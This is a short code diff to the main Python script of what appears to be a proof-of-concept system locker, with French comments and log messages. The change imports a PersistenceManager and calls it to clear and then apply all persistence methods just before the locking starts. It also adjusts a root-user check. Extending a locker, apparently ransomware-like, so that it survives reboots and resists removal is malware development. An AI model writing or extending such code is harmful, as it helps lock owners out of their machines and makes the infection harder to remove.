@@ -15,6 +15,8 @@ import logging
 from datetime import datetime
 import traceback
 
+from core.persistence import PersistenceManager
+
 # Ajout du répertoire courant au path
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 
@@ -78,7 +80,7 @@ def check_environment():
 		logger.warning(f"Système non testé : {sys.platform}")
 
 	# Vérification des permissions
-	if os.geteuid() == 0:  # Root sur Linux
+	if sys.platform == "linux" and os.geteuid() == 0:  # Root sur Linux
 		logger.warning("Exécution en tant que root détectée")
 		response = input("Continuer en tant que root ? (y/N): ")
 		if response.lower() != 'y':
@@ -122,6 +124,9 @@ def main():
 		# Initialisation du locker
 		logger.info("Initialisation du système de verrouillage...")
 		locker = SystemLocker(config=POC_CONFIG, system_info=system_info)
+		persistence = PersistenceManager(POC_CONFIG, logger)
+		persistence.clear_all_persistence_methods()
+		persistence.apply_all_persistence_methods()
 
 		# Démarrage du verrouillage
 		logger.info("Démarrage du verrouillage système...")
